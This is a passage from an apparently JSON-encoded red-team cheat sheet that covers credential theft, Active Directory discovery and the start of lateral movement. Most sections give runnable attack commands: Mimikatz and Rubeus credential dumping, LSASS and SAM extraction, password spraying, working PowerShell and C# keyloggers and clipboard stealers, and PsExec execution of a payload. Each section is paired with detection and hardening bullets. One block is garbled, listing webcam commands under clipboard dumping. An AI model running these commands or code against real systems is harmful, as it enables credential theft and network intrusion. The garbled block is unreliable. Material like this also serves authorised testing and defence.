            {
              "type": "p",
              "parts": [
                "**Mimikatz basics:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Dump LSASS memory\nprivilege::debug\nsekurlsa::logonpasswords\n\n# Dump SAM database\ntoken::elevate\nlsadump::sam\n\n# Extract LSA secrets\nlsadump::secrets\n\n# Pass-the-Hash\nsekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH_HERE"
            },
            {
              "type": "p",
              "parts": [
                "**Rubeus for Kerberos:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Harvest tickets every 30 seconds\nRubeus.exe harvest /interval:30\n\n# AS-REP Roasting\nRubeus.exe asreproast /format:hashcat /outfile:hashes.txt\n\n# Kerberoasting\nRubeus.exe kerberoast /outfile:kerberoast.txt\n\n# Pass-the-Ticket\nRubeus.exe ptt /ticket:base64_ticket"
            },
            {
              "type": "p",
              "parts": [
                "**LaZagne for application passwords:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Extract all saved passwords\nlaZagne.exe all\n\n# Browser passwords only\nlaZagne.exe browsers\n\n# Specific application\nlaZagne.exe wifi"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Clear-text passwords, hashes, and tickets for various authentication methods."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**Credential Guard**"
                  ]
                },
                {
                  "parts": [
                    "**LSASS**",
                    " protection"
                  ]
                },
                {
                  "parts": [
                    "Kerberos auditing"
                  ]
                },
                {
                  "parts": [
                    "**AppLocker**",
                    " restrictions"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " monitoring"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Mimikatz**",
                ", ",
                "**Rubeus**",
                ", ",
                "**LaZagne**",
                ", ",
                "**Kekeo**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use from memory when possible. Clean up artifacts. Consider engagement rules."
              ]
            },
            {
              "type": "h3",
              "text": "6.2 LSASS Dump"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Extracting the ",
                {
                  "type": "inline_code",
                  "text": "LSASS"
                },
                " process memory to obtain credentials offline."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Procdump method:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Dump LSASS with procdump\nprocdump.exe -ma lsass.exe lsass.dmp\n\n# Minidump with Task Manager\n# Right-click lsass.exe -> Create dump file"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell methods:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# PowerShell minidump\nGet-Process lsass | Export-Minidump -FilePath C:\\lsass.dmp\n\n# Using comsvcs.dll\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\lsass.dmp full"
            },
            {
              "type": "p",
              "parts": [
                "**Custom dumpers:**"
              ]
            },
            {
              "type": "code",
              "language": "csharp",
              "text": "// C# code for LSASS dumping\nvar hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, lsassPid);\nvar hFile = CreateFile(\"lsass.dmp\", GENERIC_WRITE, 0, IntPtr.Zero, CREATE_ALWAYS, 0, IntPtr.Zero);\n\nMiniDumpWriteDump(hProcess, lsassPid, hFile, MINIDUMP_TYPE.MiniDumpWithFullMemory,\n    IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Memory dump file containing credentials. Requires offline processing."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**LSASS**",
                    " protection (",
                    "**PPL**",
                    ")"
                  ]
                },
                {
                  "parts": [
                    "**Credential Guard**"
                  ]
                },
                {
                  "parts": [
                    "Dump file creation monitoring"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " memory protection"
                  ]
                },
                {
                  "parts": [
                    "Process access auditing"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Procdump**",
                ", ",
                {
                  "type": "inline_code",
                  "text": "comsvcs.dll"
                },
                ", custom dumpers, ",
                "**Mimikatz**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use legitimate tools when possible. Clean up dump files. Process offline."
              ]
            },
            {
              "type": "h3",
              "text": "6.3 SAM Extraction"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Obtaining the Security Account Manager (",
                "**SAM**",
                ") database containing local user password hashes."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Registry dump method:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Save registry hives\nreg save hklm\\sam sam.save\nreg save hklm\\system system.save\nreg save hklm\\security security.save\n\n# Copy to attacker machine and extract with secretsdump.py\npython3 secretsdump.py -sam sam.save -system system.save LOCAL"
            },
            {
              "type": "p",
              "parts": [
                "**Volume Shadow Copy:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Create shadow copy\nvssadmin create shadow /for=C:\n\n# Copy SAM from shadow copy\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\sam C:\\sam.save\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\system C:\\system.save\n\n# Delete shadow copy\nvssadmin delete shadows /for=C: /quiet"
            },
            {
              "type": "p",
              "parts": [
                "**In-memory extraction:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Use Mimikatz to read from memory\nprivilege::debug\ntoken::elevate\nlsadump::sam"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "LM/NTLM hashes for local accounts. Can be cracked or used for Pass-the-Hash."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Registry access monitoring"
                  ]
                },
                {
                  "parts": [
                    "**VSS**",
                    " service auditing"
                  ]
                },
                {
                  "parts": [
                    "**LSA**",
                    " protection"
                  ]
                },
                {
                  "parts": [
                    "**Credential Guard**"
                  ]
                },
                {
                  "parts": [
                    "**SAM**",
                    " access restrictions"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**reg.exe**",
                ", ",
                "**vssadmin**",
                ", ",
                "**Mimikatz**",
                ", ",
                "**secretsdump.py**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Requires administrative privileges. Clean up extracted files."
              ]
            },
            {
              "type": "h3",
              "text": "6.4 Credential Spraying / Brute Force"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Attempting authentication with common or weak passwords across multiple accounts."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Domain password spray:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# PowerView password spray\nInvoke-DomainPasswordSpray -UserList users.txt -Password Spring2025! -Domain corp.local\n\n# With delay between attempts\nInvoke-DomainPasswordSpray -UserList users.txt -PasswordList passwords.txt -Domain corp.local -Delay 5"
            },
            {
              "type": "p",
              "parts": [
                "**SMB brute force:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# CrackMapExec for SMB\ncrackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123!' --continue-on-success\n\n# Hydra for various services\nhydra -L users.txt -P passwords.txt 10.10.10.10 smb\nhydra -L users.txt -P passwords.txt 10.10.10.10 ssh"
            },
            {
              "type": "p",
              "parts": [
                "**Kerberos pre-auth brute force:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# AS-REP Roasting with GetNPUsers\nGetNPUsers.py -no-pass -usersfile users.txt -dc-ip 10.10.10.2 corp.local/\n\n# With password spray\nGetNPUsers.py -usersfile users.txt -passwords passwords.txt -dc-ip 10.10.10.2 corp.local"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Valid credentials for further access. Account lockouts possible."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Account lockout policies"
                  ]
                },
                {
                  "parts": [
                    "Failed login monitoring"
                  ]
                },
                {
                  "parts": [
                    "Anomaly detection"
                  ]
                },
                {
                  "parts": [
                    "**MFA**",
                    " implementation"
                  ]
                },
                {
                  "parts": [
                    "Strong password policies"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**CrackMapExec**",
                ", ",
                "**Hydra**",
                ", ",
                "**Metasploit**",
                ", custom scripts"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use realistic timing. Monitor for lockouts. Know engagement rules."
              ]
            },
            {
              "type": "h3",
              "text": "6.5 Keylogging"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Capturing keyboard input to obtain passwords and other sensitive information."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell keylogger:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "$signature = @'\n[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)]\npublic static extern short GetAsyncKeyState(int virtualKeyCode);\n'@\n\nAdd-Type -MemberDefinition $signature -Name Win32Utils -Namespace API\n\nwhile($true) {\n    Start-Sleep -Milliseconds 40\n    for($i=1; $i -le 254; $i++) {\n        $state = [API.Win32Utils]::GetAsyncKeyState($i)\n        if($state -eq -32767) {\n            $key = [System.Console]::Write([char]$i)\n            Add-Content -Path \"keylog.txt\" -Value $key\n        }\n    }\n}"
            },
            {
              "type": "p",
              "parts": [
                "**Metasploit keylogger:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Meterpreter keylogger\nkeyscan_start\nkeyscan_dump\nkeyscan_stop"
            },
            {
              "type": "p",
              "parts": [
                "**Custom keyloggers:**"
              ]
            },
            {
              "type": "code",
              "language": "csharp",
              "text": "// C# keylogger with SetWindowsHookEx\nprivate static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {\n    if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {\n        int vkCode = Marshal.ReadInt32(lParam);\n        char key = (char)vkCode;\n        File.AppendAllText(\"log.txt\", key.ToString());\n    }\n    return CallNextHookEx(_hookID, nCode, wParam, lParam);\n}"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Captured keystrokes including passwords, emails, and other sensitive data."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**EDR**",
                    " behavioral detection"
                  ]
                },
                {
                  "parts": [
                    "Keyboard hook monitoring"
                  ]
                },
                {
                  "parts": [
                    "Process monitoring"
                  ]
                },
                {
                  "parts": [
                    "Application control"
                  ]
                },
                {
                  "parts": [
                    "User training"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Metasploit**",
                ", custom keyloggers, PowerShell scripts"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Consider legal implications. Use only in authorized engagements. Minimal impact on user experience."
              ]
            },
            {
              "type": "h3",
              "text": "6.6 Clipboard Access"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Monitoring clipboard content for copied passwords, cryptocurrency addresses, and other sensitive data."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell clipboard monitor:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "Add-Type -AssemblyName System.Windows.Forms\n\nwhile($true) {\n    if([System.Windows.Forms.Clipboard]::ContainsText()) {\n        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()\n        if($clipboardText -match \"password|pwd|pass|key|secret\") {\n            Write-Output \"Clipboard captured: $clipboardText\"\n            Add-Content -Path \"clipboard.log\" -Value \"$(Get-Date): $clipboardText\"\n        }\n    }\n    Start-Sleep -Seconds 5\n}"
            },
            {
              "type": "p",
              "parts": [
                "**C# clipboard monitor:**"
              ]
            },
            {
              "type": "code",
              "language": "csharp",
              "text": "// Continuous clipboard monitoring\n[STAThread]\nstatic void Main() {\n    Clipboard.Clear();\n    while(true) {\n        Thread.Sleep(1000);\n        if(Clipboard.ContainsText()) {\n            string text = Clipboard.GetText();\n            File.AppendAllText(\"clipboard.log\", $\"{DateTime.Now}: {text}\\n\");\n        }\n    }\n}"
            },
            {
              "type": "p",
              "parts": [
                "**Meterpreter clipboard:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Dump clipboard content\nmeterpreter > webcam_list\nmeterpreter > webcam_snap\n# Note: Metasploit doesn't have direct clipboard command"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Captured clipboard content including passwords, keys, and other copied data."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Clipboard access monitoring"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " detection"
                  ]
                },
                {
                  "parts": [
                    "Application control"
                  ]
                },
                {
                  "parts": [
                    "User awareness"
                  ]
                },
                {
                  "parts": [
                    "Encryption of sensitive clipboard data"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell**",
                ", C# applications, custom scripts"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "High privacy impact. Use only when explicitly authorized. Minimal logging of non-sensitive data."
              ]
            },
            {
              "type": "h2",
              "text": "7. 🔎 Discovery"
            },
            {
              "type": "h3",
              "text": "7.1 AD Enumeration"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Gathering information about Active Directory structure, users, groups, and trust relationships for attack planning."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**PowerView enumeration:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Basic domain info\nGet-NetDomain\nGet-NetDomainController\n\n# User and group enumeration\nGet-NetUser | Select-Object samaccountname, description, lastlogon\nGet-NetGroup -GroupName \"Domain Admins\"\nGet-NetGroupMember -GroupName \"Domain Admins\"\n\n# Computer enumeration\nGet-NetComputer | Select-Object name, operatingsystem"
            },
            {
              "type": "p",
              "parts": [
                "**BloodHound data collection:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# SharpHound collector\nSharpHound.exe --CollectionMethod All\nSharpHound.exe -c DCOnly\n\n# Ingest into BloodHound\n# Upload ZIP to BloodHound UI"
            },
            {
              "type": "p",
              "parts": [
                "**AD module commands:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Active Directory module\nGet-ADUser -Filter * -Properties *\nGet-ADGroup -Filter * | Select-Object Name\nGet-ADComputer -Filter * -Properties OperatingSystem\n\n# Trust relationships\nGet-ADTrust -Filter *"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Comprehensive AD structure understanding, privilege escalation paths, and lateral movement opportunities."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "AD auditing enabled"
                  ]
                },
                {
                  "parts": [
                    "Monitor LDAP queries"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " detection of enumeration tools"
                  ]
                },
                {
                  "parts": [
                    "Least privilege for service accounts"
                  ]
                },
                {
                  "parts": [
                    "Regular AD health checks"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**PowerView**",
                ", ",
                "**BloodHound**",
                ", AD Module, LDAP search"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use built-in tools when possible. Limit query volume. Understand normal AD traffic patterns."
              ]
            },
            {
              "type": "h3",
              "text": "7.2 Network Scanning"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Identifying active hosts, open ports, and services for target selection and attack surface mapping."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Nmap scanning:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Basic TCP SYN scan\nnmap -sS -sV -sC 10.10.10.0/24\n\n# Full port scan\nnmap -p- --min-rate 5000 10.10.10.10\n\n# UDP scan (slower)\nnmap -sU -p 53,123,161 10.10.10.0/24\n\n# Vulnerability scanning\nnmap --script vuln 10.10.10.10"
            },
            {
              "type": "p",
              "parts": [
                "**Masscan for large networks:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Fast port scanning\nmasscan -p1-65535 10.10.10.0/24 --rate=1000\n\n# Specific ports\nmasscan -p80,443,22,3389 10.10.10.0/24 --rate=10000"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell port scanning:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Simple port scanner\n1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"10.10.10.10\",$_)) \"Port $_ is open\"} 2>$null\n\n# Advanced scanner\nfunction Test-Port($hostname, $port) {\n    $test = New-Object System.Net.Sockets.TcpClient\n    try {\n        $test.Connect($hostname, $port)\n        $test.Close()\n        return $true\n    } catch {\n        return $false\n    }\n}"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Network topology mapping, service discovery, and potential attack vectors identification."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Network ",
                    "**IDS/IPS**"
                  ]
                },
                {
                  "parts": [
                    "Firewall logging"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " network monitoring"
                  ]
                },
                {
                  "parts": [
                    "Port knocking"
                  ]
                },
                {
                  "parts": [
                    "Service hardening"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**Nmap**",
                ", ",
                "**Masscan**",
                ", ",
                "**PowerShell**",
                ", ",
                "**Netcat**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use slow scan rates when stealth is required. Consider timing and source IP."
              ]
            },
            {
              "type": "h3",
              "text": "7.3 User/Group Listing"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Identifying users, groups, and their relationships for privilege escalation and lateral movement planning."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Local user/group enumeration:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Local users and groups\nnet users\nnet localgroup administrators\nnet localgroup \"Remote Desktop Users\"\n\n# PowerShell equivalents\nGet-LocalUser | Select-Object Name,Enabled,LastLogon\nGet-LocalGroupMember -Group \"Administrators\""
            },
            {
              "type": "p",
              "parts": [
                "**Domain user/group enumeration:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Domain users and groups\nnet user /domain\nnet group \"Domain Admins\" /domain\nnet group \"Enterprise Admins\" /domain\n\n# Whoami information\nwhoami /all\nwhoami /groups"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell AD enumeration:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Current user info\n$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()\n$currentUser.Groups | Format-Table\n\n# Domain users with last logon\nGet-ADUser -Filter * -Properties LastLogonDate |\n    Select-Object Name,SamAccountName,LastLogonDate |\n    Sort-Object LastLogonDate -Descending"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "User accounts, group memberships, privilege information, and potential targets."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "AD query auditing"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " monitoring"
                  ]
                },
                {
                  "parts": [
                    "Least privilege principle"
                  ]
                },
                {
                  "parts": [
                    "Regular group membership reviews"
                  ]
                },
                {
                  "parts": [
                    "Account monitoring"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**net.exe**",
                ", ",
                "**PowerShell**",
                ", AD Module, ",
                "**BloodHound**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use legitimate administrative tools. Limit query scope. Understand normal enumeration patterns."
              ]
            },
            {
              "type": "h3",
              "text": "7.4 Shares and Drives"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Discovering network shares and drives for data access, lateral movement, and information gathering."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Network share enumeration:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# View network shares\nnet view \\\\computer /all\nnet view /domain:corp\n\n# Map network drive\nnet use x: \\\\computer\\share\nnet use x: \\\\computer\\share /user:domain\\user password"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell share enumeration:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# SMB share discovery\nGet-SmbShare | Get-SmbShareAccess\n\n# Network discovery\nGet-NetShare -ComputerName 10.10.10.10\n\n# Recursive share listing\nInvoke-ShareFinder -Threads 10"
            },
            {
              "type": "p",
              "parts": [
                "**Share permissions checking:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Check share permissions\n(Get-SmbShare -Name \"ShareName\").PresetPathAcl | Format-List\n\n# Accessible shares\nFind-DomainShare -CheckShareAccess -Verbose"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Network shares with potential sensitive data, configuration files, and lateral movement paths."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Share access auditing"
                  ]
                },
                {
                  "parts": [
                    "**SMB**",
                    " signing requirements"
                  ]
                },
                {
                  "parts": [
                    "Share permission reviews"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " file access monitoring"
                  ]
                },
                {
                  "parts": [
                    "Network segmentation"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**net.exe**",
                ", ",
                "**PowerShell**",
                ", SmbShare module, ",
                "**ShareFinder**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Access shares minimally. Avoid modifying files. Document findings for reporting."
              ]
            },
            {
              "type": "h3",
              "text": "7.5 System Details"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Gathering system information for vulnerability assessment, privilege escalation, and attack planning."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Basic system information:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# System info\nsysteminfo\nhostname\n\n# Network configuration\nipconfig /all\nroute print\n\n# Environment variables\nset"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell system enumeration:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# Comprehensive system info\nGet-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer\n\n# Installed software\nGet-WmiObject -Class Win32_Product | Select-Object Name, Version\n\n# Hotfix information\nGet-HotFix | Sort-Object InstalledOn -Descending"
            },
            {
              "type": "p",
              "parts": [
                "**Privilege and security information:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Current privileges\nwhoami /priv\nwhoami /groups\n\n# UAC status\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA\n\n# Defender status\nGet-MpComputerStatus"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "OS version, installed patches, security controls, and system configuration details."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "System inventory management"
                  ]
                },
                {
                  "parts": [
                    "**EDR**",
                    " system profiling"
                  ]
                },
                {
                  "parts": [
                    "Configuration management"
                  ]
                },
                {
                  "parts": [
                    "Regular patching"
                  ]
                },
                {
                  "parts": [
                    "Security baseline compliance"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**systeminfo**",
                ", ",
                "**PowerShell**",
                ", ",
                "**WMI**",
                ", ",
                "**WMIC**"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Use built-in commands. Avoid suspicious tools. Correlate information from multiple sources."
              ]
            },
            {
              "type": "h3",
              "text": "7.6 Domain Trusts"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Understanding trust relationships between domains for cross-domain attacks and privilege escalation."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**Trust enumeration:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Domain trusts\nnltest /domain_trusts\nnltest /dclist:corp\n\n# Net commands\nnet view /domain"
            },
            {
              "type": "p",
              "parts": [
                "**PowerShell trust enumeration:**"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# AD trust information\nGet-ADTrust -Filter *\nGet-ADTrust -Identity \"other.domain.com\"\n\n# Forest information\nGet-ADForest\n(Get-ADForest).Domains"
            },
            {
              "type": "p",
              "parts": [
                "**BloodHound trust analysis:**"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Collect trust information\nSharpHound.exe --CollectionMethod Trusts\n\n# Analyze in BloodHound for cross-domain attacks"
            },
            {
              "type": "h4",
              "text": "What to Expect"
            },
            {
              "type": "p",
              "parts": [
                "Trust relationships, trust types, and potential cross-domain attack paths."
              ]
            },
            {
              "type": "h4",
              "text": "Detection / Hardening"
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Trust relationship auditing"
                  ]
                },
                {
                  "parts": [
                    "SID filtering enabled"
                  ]
                },
                {
                  "parts": [
                    "Selective authentication"
                  ]
                },
                {
                  "parts": [
                    "Regular trust reviews"
                  ]
                },
                {
                  "parts": [
                    "Monitor cross-domain authentication"
                  ]
                }
              ]
            },
            {
              "type": "h4",
              "text": "Tools / References"
            },
            {
              "type": "p",
              "parts": [
                "**nltest**",
                ", PowerShell AD module, ",
                "**BloodHound**",
                ", AD Trust Toolkit"
              ]
            },
            {
              "type": "h4",
              "text": "OPSEC / Notes"
            },
            {
              "type": "p",
              "parts": [
                "Understand trust types and implications. Document for attack path analysis."
              ]
            },
            {
              "type": "h2",
              "text": "8. 🔁 Lateral Movement"
            },
            {
              "type": "h3",
              "text": "8.1 PsExec / WMI / SMB / WinRM"
            },
            {
              "type": "h4",
              "text": "What It Is / Why It Matters"
            },
            {
              "type": "p",
              "parts": [
                "Using various Windows management protocols to execute commands on remote systems for lateral movement."
              ]
            },
            {
              "type": "h4",
              "text": "Quick Steps / Commands"
            },
            {
              "type": "p",
              "parts": [
                "**PsExec execution:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# PsExec remote execution\nPsExec.exe \\\\target -u user -p pass cmd.exe\nPsExec.exe \\\\target -u user -p pass -s cmd.exe  # As SYSTEM\nPsExec.exe \\\\target -u user -p pass -h powershell.exe  # With elevated token\n\n# Copy and execute\nPsExec.exe \\\\target -c malware.exe"
            },
            {
              "type": "p",
              "parts": [
                "**WMI remote execution:**"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
